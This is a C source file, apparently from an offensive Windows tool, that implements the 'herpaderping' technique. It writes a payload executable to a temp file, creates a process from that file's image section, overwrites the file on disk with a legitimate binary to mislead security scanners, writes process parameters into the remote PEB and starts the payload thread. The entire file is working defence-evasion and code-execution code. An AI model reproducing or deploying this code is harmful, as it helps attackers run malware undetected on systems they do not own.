#include "injector.h"
#include "disk_io.h"
#include <stdio.h>


DWORD GetEntryPointRVA(IN PBYTE fileBuffer) {
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + ((PIMAGE_DOS_HEADER)fileBuffer)->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return 0x00;
    return ntHeaders->OptionalHeader.AddressOfEntryPoint;
}

BOOL SetupProcessParameters(IN HANDLE processHandle, IN LPWSTR targetProcessPath, OUT PVOID* outImageBase) {
    NTSTATUS status = 0;
    UNICODE_STRING usCommandLine = { 0x00 };
    UNICODE_STRING usNtImagePath = { 0x00 };
    UNICODE_STRING usCurrentDirectory = { 0x00 };
    PMY_RTL_USER_PROCESS_PARAMETERS processParams = { 0x00 };
    PVOID environment = NULL;
    PWCHAR duplicatePath = NULL;
    PWCHAR duplicatePath2 = NULL;
    PWCHAR exeExtension = NULL;
    PWCHAR lastSlash = NULL;
    MY_PEB peb = { 0x00 };
    PROCESS_BASIC_INFORMATION processInfo = { 0x00 };
    ULONG_PTR paramsBaseAddr = NULL;
    ULONG_PTR paramsEndAddr = NULL;
    SIZE_T paramsSize = 0;
    SIZE_T bytesWritten = 0;
    PVOID tempPointer = NULL;

    if (!(duplicatePath = _wcsdup(targetProcessPath)))
        goto CLEANUP;

    if (lastSlash = wcsrchr(duplicatePath, L'\\'))
        *lastSlash = L'\0';

    if (!(duplicatePath2 = _wcsdup(targetProcessPath)))
        goto CLEANUP;

    if (exeExtension = wcsstr(duplicatePath2, L".exe"))
        *(exeExtension + sizeof(".exe")) = L'\0';

    if (!GlobalNtApiTable.CreateEnvironmentBlock(&environment, NULL, TRUE)) {
        fprintf(stderr, "[-] CreateEnvironmentBlock\n");
        goto CLEANUP;
    }
    GlobalNtApiTable.RtlInitUnicodeString(&usCommandLine, targetProcessPath);
    GlobalNtApiTable.RtlInitUnicodeString(&usCurrentDirectory, duplicatePath);
    GlobalNtApiTable.RtlInitUnicodeString(&usNtImagePath, duplicatePath2);

    status = GlobalNtApiTable.RtlCreateProcessParametersEx(
        &processParams,
        &usNtImagePath,
        &usCurrentDirectory,
        &usCommandLine,
        NULL,
        environment,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] RtlCreateProcessParametersEx\n");
        return FALSE;
    }
    if (!NT_SUCCESS((status = GlobalNtApiTable.NtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,
        &processInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    )))) {
        fprintf(stderr, "[-] NtQueryInformationProcess\n");
        return FALSE;
    }

    if (!NT_SUCCESS((status = GlobalNtApiTable.NtReadVirtualMemory(
        processHandle,
        processInfo.PebBaseAddress,
        &peb,
        sizeof(PEB),
        NULL
    )))) {
        fprintf(stderr, "[-] NtReadVirtualMemory\n");
        return FALSE;
    }
    printf("[+] Target Process PEB: 0x%p\n", processInfo.PebBaseAddress);
    printf("[+] Target Process Image Base: 0x%p\n", (*outImageBase = peb.Reserved3[1]));
    
    paramsBaseAddr = (ULONG_PTR)processParams;
    paramsEndAddr = (ULONG_PTR)processParams + processParams->Length;

    if (processParams->Environment) {
        if ((ULONG_PTR)processParams > (ULONG_PTR)processParams->Environment) {
            paramsBaseAddr = (PVOID)processParams->Environment;
        }
        if ((ULONG_PTR)processParams->Environment + processParams->EnvironmentSize > paramsEndAddr) {
            paramsEndAddr = (ULONG_PTR)processParams->Environment + processParams->EnvironmentSize;
        }
    }

    paramsSize = paramsEndAddr - paramsBaseAddr;
    tempPointer = processParams;

    status = GlobalNtApiTable.NtAllocateVirtualMemory(
        processHandle,
        &tempPointer,
        0,
        &paramsSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtAllocateVirtualMemory\n");
        return FALSE;
    }

    status = GlobalNtApiTable.NtWriteVirtualMemory(
        processHandle,
        processParams,
        processParams,
        processParams->Length,
        &bytesWritten
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtWriteVirtualMemory1\n");
        return FALSE;
    }

    if (processParams->Environment) {
        status = GlobalNtApiTable.NtWriteVirtualMemory(
            processHandle,
            (LPVOID)(processParams->Environment),
            (LPVOID)processParams->Environment,
            processParams->EnvironmentSize,
            &bytesWritten
        );
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtWriteVirtualMemory2\n");
            printf("[i] Wrote %zu Of %zu Bytes \n", bytesWritten, processParams->EnvironmentSize);
            return FALSE;
        }
    }
    status = GlobalNtApiTable.NtWriteVirtualMemory(
        processHandle,
        &processInfo.PebBaseAddress->ProcessParameters,
        &processParams,
        sizeof(PVOID),
        &bytesWritten
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtWriteVirtualMemory2\n");
        printf("[i] Wrote %zu Of %zu Bytes \n", bytesWritten, sizeof(PVOID));
        return FALSE;
    }
    return TRUE;

CLEANUP:
    if (duplicatePath) free(duplicatePath);
    if (duplicatePath2) free(duplicatePath2);
    return FALSE;
}

BOOL ExecuteHerpaderping(IN LPWSTR tempFilePath, IN LPWSTR legitImagePath, IN PBYTE payloadBuffer, IN DWORD payloadSize) {
    NTSTATUS status = 0;
    HANDLE threadHandle = NULL;

    if (!tempFilePath || !legitImagePath || !payloadBuffer || !payloadSize) {
        return FALSE;
    }
    DWORD entryPointRVA = GetEntryPointRVA(payloadBuffer);
    if (!entryPointRVA) return FALSE;

    PWCHAR duplicatePath = _wcsdup(tempFilePath);
    if (!duplicatePath) return FALSE;

    PWCHAR tempExt = wcsstr(duplicatePath, L".tmp");
    if (tempExt) {
        *(tempExt + sizeof(".tmp")) = L'\0';
    }

    HANDLE tempFileHandle = CreateFileW(
        duplicatePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (tempFileHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileW 'TempFile' Failed With error : %d\n", GetLastError());
        return FALSE;
    }

    HANDLE legitFileHandle = CreateFileW(
        legitImagePath,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (legitFileHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileW 'Legit' Failed With Error : %d\n", GetLastError());
        return FALSE;
    }
    
    // Write payload to temp file
    if (!OverwriteTargetFile(NULL, payloadBuffer, payloadSize, tempFileHandle, FALSE)) {
        return FALSE;
    }
    printf("[+] Wrote the payload to the created temp file\n");

    HANDLE sectionHandle = NULL;
    if ((status = GlobalNtApiTable.NtCreateSection(
        &sectionHandle,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        tempFileHandle
    )) != 0x0) {
        fprintf(stderr, "[-] NtCreateSection Failed %lu\n", status);
        return FALSE;
    }
    printf("[+] Created a section handle of the temp file : 0x%0.8X\n", sectionHandle);

    HANDLE processHandle = NULL;
    if ((status = GlobalNtApiTable.NtCreateProcessEx(
        &processHandle,
        PROCESS_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        PROCESS_CREATION_FLAG_INHERIT_HANDLES,
        sectionHandle,
        NULL,
        NULL,
        FALSE
    )) != 0x0) {
        fprintf(stderr, "[-] NtCreateProcessEx Failed %lu\n", status);
        return FALSE;
    }

    printf("[+] Herpa Process Created With PID : %d\n", GetProcessId(processHandle));
    CloseHandle(sectionHandle);

    // Overwrite temp file with legit binary
    if (!OverwriteTargetFile(legitFileHandle, NULL, 0, tempFileHandle, TRUE)) {
        return FALSE;
    }
    printf("[+] Overwrote the temp file with the legit binary *_-\n");
    CloseHandle(tempFileHandle);
    CloseHandle(legitFileHandle);

    PVOID imageBase = NULL;
    PVOID entryPointAddress = NULL;

    printf("[+] Initialize Process Params .. \n");
    if (!SetupProcessParameters(processHandle, tempFilePath, &imageBase) || !imageBase) {
        return FALSE;
    }

    entryPointAddress = (PVOID)((ULONG_PTR)imageBase + entryPointRVA);

    printf("[+] Herpa Process Entry Point : 0x%p\n", entryPointAddress);

    status = GlobalNtApiTable.NtCreateThreadEx(
        &threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        processHandle,
        entryPointAddress,
        NULL,
        FALSE,
        0x00, 0x00, 0x00,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtCreateThreadEx\n");
        return FALSE;
    }

    printf("[+] Payload PE Executed With Thread OF ID : %d\n", GetThreadId(threadHandle));
    return TRUE;
}
